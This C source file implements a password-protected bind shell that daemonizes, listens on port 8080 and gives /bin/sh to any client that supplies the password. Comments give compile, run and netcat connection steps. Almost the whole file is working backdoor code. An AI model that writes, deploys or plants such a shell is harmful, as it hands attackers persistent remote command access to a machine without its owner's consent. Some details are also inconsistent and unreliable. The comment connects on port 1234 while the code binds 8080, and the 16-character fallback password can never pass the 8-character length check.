#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#define PORT 8080
#define BACKLOG 3
#define BUFFER_SIZE 1024
#define PASSWD_LENGTH 8
#define SHELL_PATH "/bin/sh"

//gcc -o BindWithPassword BindWithPassword.c

//export PW=abcd1234
//./BindWithPassword

//nc 10.10.10.5 1234


// Constant-time string comparison to avoid timing attacks
int secure_compare(const char *a, const char *b, size_t len) {
    volatile unsigned char result = 0;
    for (size_t i = 0; i < len; ++i) {
        result |= a[i] ^ b[i];
    }
    return result;
}

void handle_connection(int client_sockfd, const char *passwd) {
    char buffer[BUFFER_SIZE] = {0};
    const char *prompt = "Enter password:\n";
    const char *granted = "Access granted\n";
    const char *denied = "Access denied\n";

    if (send(client_sockfd, prompt, strlen(prompt), 0) < 0) {
        perror("send");
        close(client_sockfd);
        return;
    }

    ssize_t recv_len = recv(client_sockfd, buffer, BUFFER_SIZE - 1, 0);
    if (recv_len <= 0) {
        close(client_sockfd);
        return;
    }

    buffer[recv_len] = '\0';
    char *newline = strchr(buffer, '\n');
    if (newline) *newline = '\0';

    if (strlen(buffer) == PASSWD_LENGTH &&
        secure_compare(buffer, passwd, PASSWD_LENGTH) == 0) {

        if (send(client_sockfd, granted, strlen(granted), 0) < 0) {
            perror("send");
            close(client_sockfd);
            return;
        }

        dup2(client_sockfd, STDIN_FILENO);
        dup2(client_sockfd, STDOUT_FILENO);
        dup2(client_sockfd, STDERR_FILENO);

        execl(SHELL_PATH, "sh", NULL);
        perror("execl failed");
        _exit(1);
    } else {
        send(client_sockfd, denied, strlen(denied), 0);
    }

    close(client_sockfd);
    memset(buffer, 0, sizeof(buffer));
}

int main() {
    int sockfd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);
    int opt = 1;

    signal(SIGCHLD, SIG_IGN); // Prevent zombie processes

    const char *env_passwd = getenv("PW");
    const char *passwd = (env_passwd && strlen(env_passwd) == PASSWD_LENGTH) ? env_passwd : "bindpassword2839";

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("setsockopt");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    if (listen(sockfd, BACKLOG) < 0) {
        perror("listen");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Daemonize process
    if (fork() != 0) exit(0);
    setsid();

    while (1) {
        client_fd = accept(sockfd, (struct sockaddr *)&client_addr, &addr_len);
        if (client_fd < 0) {
            perror("accept");
            continue;
        }

        if (fork() == 0) {
            close(sockfd);
            handle_connection(client_fd, passwd);
            exit(0);
        }

        close(client_fd);
    }

    close(sockfd);
    return 0;
}
